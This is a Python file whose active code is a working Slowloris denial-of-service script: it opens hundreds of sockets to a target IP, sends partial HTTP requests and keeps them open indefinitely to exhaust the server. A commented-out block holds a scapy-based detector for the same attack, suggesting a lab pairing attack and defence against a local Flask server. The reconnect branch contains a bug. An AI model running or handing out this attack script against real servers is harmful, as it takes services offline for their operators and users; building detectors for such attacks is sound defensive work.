
import socket
import random
import time

def slowloris(ip):
    try:
        headers = [
            "User-agent: Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0",
            "Accept-language: en-US,en,q=0.5",
            "Connection: Keep-Alive"
        ]
        sockets = []

        #==Changeable Params==
        numberOfSockets = 200
        port = 5000
        timeToSleep = 1
        #=====================

        print("Creating sockets...")
        for i in range(numberOfSockets):
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(4)
                s.connect((ip, port))
                sockets.append(s)
            except Exception as e:
                print(e)
        num = 0
        for s in sockets:
            num += 1 
            s.send("GET /?{} HTTP/1.1\r\n".format(random.randint(0, 2000)).encode("utf-8"))
            for header in headers:
                s.send(bytes("{}\r\n".format(header).encode("utf-8")))
 
        print("Start Attacking " + ip)
        while True:
            for s in sockets:
                try:
                    print("Sending Packet...")
                    s.send("X-a: {}\r\n".format(random.randint(1,5000)).encode("utf-8"))
                except:
                    sockets.remove(s)
                    try:
                        s.socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        s.settimeout(4)
                        s.connect((ip,port))
                        s.send("GET /?{} HTTP/1.1\r\n".format(random.randint(0,2000)).encode("utf-8"))

                        for header in headers:
                            s.send(bytes("{}\r\n".format(header).encode("utf-8")))
                    except:
                        pass
            print("sleeping for " + str(timeToSleep) + " seconds.")
            time.sleep(timeToSleep)

    except ConnectionRefusedError:
        slowloris(ip)



"""
from scapy.all import *
from scapy.layers.inet import *
import time

request_times = {}
returnString = ""

TARGET_PORT = 5000
THRESHOLD = 50
WINDOW = 3

def detect_slowloris(packet):
    global request_times
    global returnString

    if not packet.haslayer(IP) or not packet.haslayer(TCP):
        return False

    ip = packet[IP]
    tcp = packet[TCP]

    # only incoming packets to Flask server
    if tcp.dport != TARGET_PORT:
        return False

    now = time.time()
    src = ip.src

    if src not in request_times:
        request_times[src] = []

    request_times[src].append(now)
    request_times[src] = [t for t in request_times[src] if now - t <= WINDOW]

    print(f"{src} possible Slowloris packets in last {WINDOW}s: {len(request_times[src])}")

    if len(request_times[src]) > THRESHOLD:
        returnString = f"Slowloris attack detected from {src}"
        return True

    return False

def incoming_filter(packet):
    return packet.haslayer(IP) and packet.haslayer(TCP)

def detectMain(iface, return_dict):
    print("Detecting Slowloris attack...")
    sniff(
        lfilter=incoming_filter,
        iface=iface,
        stop_filter=detect_slowloris,
        store=False
    )
    return_dict[0] = returnString
"""
